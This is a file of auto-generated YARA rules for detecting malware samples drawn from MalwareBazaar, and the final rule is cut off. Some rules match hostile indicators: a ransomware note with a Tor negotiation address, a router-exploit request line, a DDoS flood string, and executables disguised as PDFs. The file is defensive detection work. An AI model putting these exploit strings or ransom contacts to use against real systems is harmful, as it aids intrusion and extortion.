rule Windows_001f940536b97e346bbec3d23943128172f9b80adc7f55cf59928206f3e0eb35{
    meta:
        description = "Auto ML: 001f940536b97e346bbec3d23943128172f9b80adc7f55cf59928206f3e0eb35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.dll"
        $s2 = "WS2_32.dll"
        $s3 = "ADVAPI32.dll"
        $s4 = "GDI32.dll"
        $s5 = "gdiplus.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6084KB
        and all of them
}

rule Linux_011b0363e2b125d98402378784d98d848aab0d8a79136a1da0379871228508af{
    meta:
        description = "Auto ML: 011b0363e2b125d98402378784d98d848aab0d8a79136a1da0379871228508af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

rule Windows_0e4ae06cb5ecca430d104edf89eaf6898a84a310e9951862ac6c953826856728{
    meta:
        description = "Auto ML: 0e4ae06cb5ecca430d104edf89eaf6898a84a310e9951862ac6c953826856728"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "link.exe"
        $s2 = "kernel32.dll"
        $s3 = "user32.dll"
        $s4 = "ntdll.dll"
        $s5 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 45KB
        and all of them
}

rule Windows_8ec4a944f9be73731c55274731bfb2a1fefe13cb6a4c688d013104467aabe170{
    meta:
        description = "Auto ML: 8ec4a944f9be73731c55274731bfb2a1fefe13cb6a4c688d013104467aabe170"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sypbdjojrgpthq.dll"
        $s2 = "PNYwBPtLqKRncRsdNmclwyRVUknwZfTpEQusEGoQPMyAjLDYFvEfMAERvCbQbxlLrbjLXzZGyLWkAQl"
        $s3 = "kuvYYBTITfvoBHcsYQpoIjMftpbhVWuPnVjFvUttS"
        $s4 = "AfjiUtHLqPqJrdzhjGKXAFwdwcPxVZxwmLjkGjEYUdltJEIjETYnIupujFlrdJpQStXftPbABmDWTCUsUgsCBJorWoBAxMvKnVb"
        $s5 = "DownloadFileFromFtp"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 225KB
        and all of them
}

rule Windows_8ec50ee4a15519c0be0d0f8f65f9d8d4f13a98e6b72c9e0eeabc4d984524d213{
    meta:
        description = "Auto ML: 8ec50ee4a15519c0be0d0f8f65f9d8d4f13a98e6b72c9e0eeabc4d984524d213"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.dll"
        $s2 = "GDI32.dll"
        $s3 = "COMDLG32.dll"
        $s4 = "ADVAPI32.dll"
        $s5 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 991KB
        and all of them
}

rule Linux_8ec9dfa52e933ed9a8a7b3a64f0f540ed655ea99c3c650d14d5539f772b90788{
    meta:
        description = "Auto ML: 8ec9dfa52e933ed9a8a7b3a64f0f540ed655ea99c3c650d14d5539f772b90788"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "/proc/self/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB
        and all of them
}

rule Windows_8edd936e952bca539ce6511f2718aaa7d93ac0d3e0d15958f6abda24b4c3b804{
    meta:
        description = "Auto ML: 8edd936e952bca539ce6511f2718aaa7d93ac0d3e0d15958f6abda24b4c3b804"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.dll"
        $s2 = "USER32.dll"
        $s3 = "GDI32.dll"
        $s4 = "SHELL32.dll"
        $s5 = "ADVAPI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1605KB
        and all of them
}

rule Windows_8ee4ea585c3ee9b147b068a8051494017540f9e6052ff79266bf9ef47056956a{
    meta:
        description = "Auto ML: 8ee4ea585c3ee9b147b068a8051494017540f9e6052ff79266bf9ef47056956a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http/1.1"
        $s2 = "http/1.1H;D$9u"
        $s3 = "FTP: The server failed to connect to data port"
        $s4 = "FTP: Accepting server connect has timed out"
        $s5 = "FTP: The server did not accept the PRET command."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1846KB
        and all of them
}

rule Windows_8f44201b56398e30425dab3f99cda8c490e3b4ded5f8d545de18f779f1feb6e9{
    meta:
        description = "Auto ML: 8f44201b56398e30425dab3f99cda8c490e3b4ded5f8d545de18f779f1feb6e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "gMSB3211: The assembly '{0}' is not registered for COM Interop. Please register it with regasm.exe /tlb."
        $s2 = "SignTool.exe not found."
        $s3 = "xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\""
        $s4 = "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\""
        $s5 = "xmlns:dsig=\"http://www.w3.org/2000/09/xmldsig#\""

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 772KB
        and all of them
}

rule Linux_8f521e02c757b114ab91ad79addd1890364f9b1e952b683c2460e1fbe8854278{
    meta:
        description = "Auto ML: 8f521e02c757b114ab91ad79addd1890364f9b1e952b683c2460e1fbe8854278"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s2 = "/proc/self/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 37KB
        and all of them
}

rule Windows_8f61baa94fb46ff25bc93262bb7cf370f22914d8e97d3546fd70f69c7cd06eaf{
    meta:
        description = "Auto ML: 8f61baa94fb46ff25bc93262bb7cf370f22914d8e97d3546fd70f69c7cd06eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "8HDFED.exe"
        $s2 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Windows_8f6952d8695ee78e7c79808b37e18213d29fc67db10b4c7872259e153256195f{
    meta:
        description = "Auto ML: 8f6952d8695ee78e7c79808b37e18213d29fc67db10b4c7872259e153256195f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "bJwb.exe"
        $s2 = "mscoree.dll"
        $s3 = "!?$7\\)o\\HYa"
        $s4 = "rj*|sBb/D/i9"
        $s5 = "\\wqo\\L"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 858KB
        and all of them
}

rule Windows_8f9c9b00fc65ab0f943bace26a7c2f921f5eebb04bcfa8fb33708c8fc7358be5{
    meta:
        description = "Auto ML: 8f9c9b00fc65ab0f943bace26a7c2f921f5eebb04bcfa8fb33708c8fc7358be5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "        name=\"Enigma.exe\""
        $s2 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s3 = "http://pki-ocsp.symauth.com0"
        $s4 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s5 = "kernel32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB
        and all of them
}

rule Linux_0e7d08b6fb10ab0cde7281fc25962710608a9fc1508c7e3593194d768e48331d{
    meta:
        description = "Auto ML: 0e7d08b6fb10ab0cde7281fc25962710608a9fc1508c7e3593194d768e48331d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "skyljne.sh4"
        $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 149KB
        and all of them
}

rule Windows_8fac886c8726f7232be7b4d5e0c75c01376b606941c7ca9e5789d8e642a76d4d{
    meta:
        description = "Auto ML: 8fac886c8726f7232be7b4d5e0c75c01376b606941c7ca9e5789d8e642a76d4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 8031KB
        and all of them
}

rule Linux_8fba1858e0b6e9d822cd380b8bd5b738e0e65531ae308a4dee61b8fcf5196d40{
    meta:
        description = "Auto ML: 8fba1858e0b6e9d822cd380b8bd5b738e0e65531ae308a4dee61b8fcf5196d40"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/proc/net/tcp"
        $s4 = "?/dev/null"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Linux_8fc71a29a61edcb72913fc03a5477b43d414b1d854f8d9d784cf79a508c82ed6{
    meta:
        description = "Auto ML: 8fc71a29a61edcb72913fc03a5477b43d414b1d854f8d9d784cf79a508c82ed6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "HTTP/1.1 404 Not Found"
        $s3 = "HTTP/1.1 200 OK"
        $s4 = "skyljne.sh4"
        $s5 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 197KB
        and all of them
}

rule Windows_9024a473b6244e9aef3f65da784300194ff67434a204b445e5099ea80c19f949{
    meta:
        description = "Auto ML: 9024a473b6244e9aef3f65da784300194ff67434a204b445e5099ea80c19f949"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FTPjK"
        $s2 = "FtPj;"
        $s3 = "ADVAPI32.DLL"
        $s4 = "USER32.DLL"
        $s5 = "KERNEL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB
        and all of them
}

rule Linux_90631e8f2658ee4c8030fa20aa99f294036e47877beb6ad72dff5aa5932e7807{
    meta:
        description = "Auto ML: 90631e8f2658ee4c8030fa20aa99f294036e47877beb6ad72dff5aa5932e7807"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".shstrtab"
        $s2 = "/system/bin/linker"
        $s3 = "/sbin/adbd"
        $s4 = "/dev/graphics/fb%d"
        $s5 = "/dev/msm_rotator"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 10KB
        and all of them
}

rule Android_90c41e52f5ac57b8bd056313063acadc753d44fb97c45c2dc58d4972fe9f9f21{
    meta:
        description = "Auto ML: 90c41e52f5ac57b8bd056313063acadc753d44fb97c45c2dc58d4972fe9f9f21"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/shader/unsharp_edge_compare_fragment.sh"
        $s2 = "assets/shader/unsharp_edge_fragment.sh"
        $s3 = "assets/shader/unsharp_edge_vertex.sh"
        $s4 = "lFTP*"
        $s5 = "assets/shader/unsharp_edge_compare_fragment.shPK"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 3282KB
        and all of them
}

rule Windows_90c757f5291c89a9f86ac63c59868538f3dea52b0d8555ec1445f63e50e219a3{
    meta:
        description = "Auto ML: 90c757f5291c89a9f86ac63c59868538f3dea52b0d8555ec1445f63e50e219a3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "libgcc_s_dw2-1.dll"
        $s2 = "KERNEL32.dll"
        $s3 = "msvcrt.dll"
        $s4 = "SHELL32.dll"
        $s5 = "5.sH"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10939KB
        and all of them
}

rule Windows_90dd210c9c67ffa0ecd9a20c1b76d0ecd2ee8669804d736b44a530ab818baec6{
    meta:
        description = "Auto ML: 90dd210c9c67ffa0ecd9a20c1b76d0ecd2ee8669804d736b44a530ab818baec6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "COMCTL32.DLL"
        $s2 = "ole32.dll"
        $s3 = ".bat"
        $s4 = ".cmd"
        $s5 = ".exe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2146KB
        and all of them
}

rule Windows_90f43f41f50f5c7f266f9353d21c3733468bad8644be318d48568415a6d9b89b{
    meta:
        description = "Auto ML: 90f43f41f50f5c7f266f9353d21c3733468bad8644be318d48568415a6d9b89b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Runtime.exe"
        $s2 = "S.SySL@"
        $s3 = "Chttp://www.microsoft.com/pkiops/crl/MicWinProPCA2011_2011-10-19.crl0a"
        $s4 = "Ehttp://www.microsoft.com/pkiops/certs/MicWinProPCA2011_2011-10-19.crt0"
        $s5 = "Ehttp://crl.microsoft.com/pki/crl/products/MicRooCerAut_2010-06-23.crl0Z"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB
        and all of them
}

rule Windows_9120ce3b64b1eea0eccc343744f4e8ff3bdc88b8a79743e07a975c6c313789ee{
    meta:
        description = "Auto ML: 9120ce3b64b1eea0eccc343744f4e8ff3bdc88b8a79743e07a975c6c313789ee"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "u.ShTgB"
        $s2 = "Could not find \"setup.exe\"."
        $s3 = " \"setup.exe\" "
        $s4 = "ntdll.dll"
        $s5 = "c:\\windows\\system32\\ntdll.dll"

    condition:
        uint32(0) == 0x00605a4d and
        filesize < 1389KB
        and all of them
}

rule Linux_0e96ac537b36292f0271b501abc7abb8e511647b4e8dc314700e4a3f928f85fb{
    meta:
        description = "Auto ML: 0e96ac537b36292f0271b501abc7abb8e511647b4e8dc314700e4a3f928f85fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s2 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s3 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s4 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s5 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 101KB
        and all of them
}

rule Windows_912219efa4940fedba91e95f161b179e83191ef6c4eb15be2a8bee66cb988f6f{
    meta:
        description = "Auto ML: 912219efa4940fedba91e95f161b179e83191ef6c4eb15be2a8bee66cb988f6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "USER32.DLL"
        $s2 = "msimg32.dll"
        $s3 = "KERNEL32.dll"
        $s4 = "GDI32.dll"
        $s5 = "SHELL32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_913377afa6c3d7afb49a491f830d52a33353349819f0e91157a01dc8336ac5b3{
    meta:
        description = "Auto ML: 913377afa6c3d7afb49a491f830d52a33353349819f0e91157a01dc8336ac5b3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%.SH"
        $s2 = "mscoree.dll"
        $s3 = "server1.exe"
        $s4 = "kernel32.dll"
        $s5 = "System.IO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 583KB
        and all of them
}

rule Windows_9133b62cf224ab836d86d3aff622629e91730a557ade8fc281261a9f49e7b319{
    meta:
        description = "Auto ML: 9133b62cf224ab836d86d3aff622629e91730a557ade8fc281261a9f49e7b319"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "skdc25wi352.exe"
        $s2 = "kernel32.dll"
        $s3 = "user32.dll"
        $s4 = "advapi32.dll"
        $s5 = "Kernel32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 820KB
        and all of them
}

rule Linux_91546d003ebb7245338193b6593470b3d0b4a8a249b9fc863afe35f42d2609e8{
    meta:
        description = "Auto ML: 91546d003ebb7245338193b6593470b3d0b4a8a249b9fc863afe35f42d2609e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/compress/usr/"
        $s4 = "/proc/self/exe"
        $s5 = "/proc/stat"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB
        and all of them
}

rule Linux_917053f9fda8808ce0ae455c527011de8444e0f86e87de0f20c38b05153324d5{
    meta:
        description = "Auto ML: 917053f9fda8808ce0ae455c527011de8444e0f86e87de0f20c38b05153324d5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 18KB
        and all of them
}

rule Windows_91a358840c88bc0b3152b2724d5d23c333d1cb78ec042fb99b11842d1b63a2fd{
    meta:
        description = "Auto ML: 91a358840c88bc0b3152b2724d5d23c333d1cb78ec042fb99b11842d1b63a2fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB
        and all of them
}

rule Windows_9219d0d478084b4376d2d8bddd299578e641adcc84d55623d630a9a46044ef19{
    meta:
        description = "Auto ML: 9219d0d478084b4376d2d8bddd299578e641adcc84d55623d630a9a46044ef19"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HttpMethod"
        $s2 = "HttpStatusCode"
        $s3 = "HttpResponseMessage"
        $s4 = "HttpRequestMessage"
        $s5 = "Doc_18029117pdf.exe"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 781KB
        and all of them
}

rule Windows_9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc{
    meta:
        description = "Auto ML: 9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "To initiate negotiations, please download the Tor Browser using their official website: https://www.torproject.org/"
        $s2 = "use these credentials to enter the Chat for text negotiation: http://jqlcrn2fsfvxlngdq53rqyrwtwfrulup74xyle54bsvo3l2kgpeeijid.onion/x89yk54gGqjJ8ZAduh5dioahO1TXRA"
        $s3 = "kernel32.dll"
        $s4 = "KERNEL32.dll"
        $s5 = "USER32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 217KB
        and all of them
}

rule Windows_924c4262387d3016bbd79022ee36bb595a046744759a307bc9ba7f9374da888c{
    meta:
        description = "Auto ML: 924c4262387d3016bbd79022ee36bb595a046744759a307bc9ba7f9374da888c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s2 = "http://www.zerowork.cn"
        $s3 = "COMCTL32.DLL"
        $s4 = "user32.dll"
        $s5 = "iphlpapi.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1465KB
        and all of them
}

rule Linux_928d37db91b67a90a3fd7f9bd599c2639ba2bd754aa8c8b19499e3611eec5a5a{
    meta:
        description = "Auto ML: 928d37db91b67a90a3fd7f9bd599c2639ba2bd754aa8c8b19499e3611eec5a5a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/proc/%d"
        $s4 = "/proc/self"
        $s5 = "/proc/%d/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB
        and all of them
}

rule Windows_0eba2b6e7c10156a15d9c09d2cb7c20c34e1f024c4627159d7afb9b3be7d39af{
    meta:
        description = "Auto ML: 0eba2b6e7c10156a15d9c09d2cb7c20c34e1f024c4627159d7afb9b3be7d39af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RECw.exe"
        $s2 = ".SH8\",:"
        $s3 = "mscoree.dll"
        $s4 = "(?<type>\\w+)(?<filter>\\[(?<prop>\\w+)(?<equalType>[*^$]?=)(?<value>\\w+)\\])*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 634KB
        and all of them
}

rule Windows_92ae585601392f31c4d97172681645d0353c8cdf425e40a5f89581b40643c3f8{
    meta:
        description = "Auto ML: 92ae585601392f31c4d97172681645d0353c8cdf425e40a5f89581b40643c3f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "2DSFVCXVCX.exe"
        $s2 = "mscoree.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6KB
        and all of them
}

rule Windows_92d28b540d63ccc0f54b297859ab68896fa9f650e7db459e27a4c7af271257f9{
    meta:
        description = "Auto ML: 92d28b540d63ccc0f54b297859ab68896fa9f650e7db459e27a4c7af271257f9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "advapi32.dll"
        $s2 = "setupx.dll"
        $s3 = "setupapi.dll"
        $s4 = ".BAT"
        $s5 = "advpack.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2993KB
        and all of them
}

rule Linux_92f16c6b9168dd2bf302f99ee0981885327c91f0ef028749d5242e4ad67598f0{
    meta:
        description = "Auto ML: 92f16c6b9168dd2bf302f99ee0981885327c91f0ef028749d5242e4ad67598f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " HTTP/1.1"
        $s2 = "[http flood] headers: \"%s\""
        $s3 = "http"
        $s4 = ".shstrtab"
        $s5 = "/proc/stat"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB
        and all of them
}

rule Linux_9315c9e9c5a4c97d451a7abe9c874d1f10e8a5128f9832ed95096e8690cd8a3c{
    meta:
        description = "Auto ML: 9315c9e9c5a4c97d451a7abe9c874d1f10e8a5128f9832ed95096e8690cd8a3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/proc/net/tcp"
        $s4 = "/dev/null"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_9397e1a3bd7e94ae5213d8dc4edef5e73fe8c6f0306196a1ffae832a3976e9ac{
    meta:
        description = "Auto ML: 9397e1a3bd7e94ae5213d8dc4edef5e73fe8c6f0306196a1ffae832a3976e9ac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "user32.dll"
        $s4 = "oleaut32.dll"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4589KB
        and all of them
}

rule Windows_93a039cd592c64a14e6e688f805b8f069cc2ec03a1d07ce6bb8db3b4fefe9745{
    meta:
        description = "Auto ML: 93a039cd592c64a14e6e688f805b8f069cc2ec03a1d07ce6bb8db3b4fefe9745"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.DLL"
        $s2 = "ADVAPI32.dll"
        $s3 = "COMCTL32.dll"
        $s4 = "COMDLG32.dll"
        $s5 = "GDI32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1758KB
        and all of them
}

rule Windows_93a2c3a7562db6cc54e76e271e95717d18ab7016631719206700464aa452e913{
    meta:
        description = "Auto ML: 93a2c3a7562db6cc54e76e271e95717d18ab7016631719206700464aa452e913"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "KERNEL32.dll"
        $s2 = "USER32.dll"
        $s3 = "Stubakion502.exe"
        $s4 = "86\\Debug\\Stubakion502.pdb"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 585KB
        and all of them
}

rule Linux_93bee6e417bff657b4aee266e11a1c220a86989b8aeb8f9b279f8fcd37c64921{
    meta:
        description = "Auto ML: 93bee6e417bff657b4aee266e11a1c220a86989b8aeb8f9b279f8fcd37c64921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = ".shstrtab"
        $s3 = "/proc/self/exe"
        $s4 = "/dev/null"
        $s5 = "/dev/console"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB
        and all of them
}

rule Windows_940fb14d8859c02f6df35e6345ac7f3b5c39df3e59a59b02575a8dbb879eb523{
    meta:
        description = "Auto ML: 940fb14d8859c02f6df35e6345ac7f3b5c39df3e59a59b02575a8dbb879eb523"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "dleiFtpurretnI"
        $s2 = "Doc_102628227pdf.exe"
        $s3 = "mscoree.dll"
        $s4 = "http://ocsp.digicert.com0I"
        $s5 = "=http://cacerts.digicert.com/DigiCertHighAssuranceEVRootCA.crt0K"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 717KB
        and all of them
}

rule Linux_944035b2dc54907819cf64c2b8c2acc0771485ebe1ac229f47fd8fdcaff5cbb1{
    meta:
        description = "Auto ML: 944035b2dc54907819cf64c2b8c2acc0771485ebe1ac229f47fd8fdcaff5cbb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".shst"
        $s2 = "/proc/self/exe"
        $s3 = "/self/ex"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Windows_0f11aeecbde1f355d26c9d406dad80cb0ae8536aea31fdddaf915d4afd434f3f{
    meta:
        description = "Auto ML: 0f11aeecbde1f355d26c9d406dad80cb0ae8536aea31fdddaf915d4afd434f3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".exe"
        $s2 = "FTp>A"
